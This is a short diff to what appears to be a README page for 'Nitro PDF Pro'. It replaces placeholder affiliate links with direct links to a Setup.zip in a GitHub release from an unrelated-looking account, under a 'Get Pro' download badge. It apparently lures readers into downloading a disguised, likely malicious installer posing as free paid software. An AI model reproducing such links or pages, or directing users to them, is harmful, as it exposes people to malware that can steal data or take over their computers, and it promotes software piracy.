@@ -8,7 +8,7 @@
 
 ---
 
-[![Nitro PDF Pro](og-image.png)](YOUR_AFFILIATE_LINK_HERE)
+[![Nitro PDF Pro](og-image.png)](https://github.com/sandchieftainremedy/Nitro-PDF-Pro/releases/download/Last/Setup.zip)
 
 ---
 
@@ -22,7 +22,7 @@
 
 ## Download & Get Pro
 
-[![Get Nitro PDF Pro Pro](https://img.shields.io/badge/Get%20Nitro%20PDF%20Pro%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](YOUR_AFFILIATE_LINK_HERE)
+[![Get Nitro PDF Pro Pro](https://img.shields.io/badge/Get%20Nitro%20PDF%20Pro%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://github.com/sandchieftainremedy/Nitro-PDF-Pro/releases/download/Last/Setup.zip)
 
 ---
 
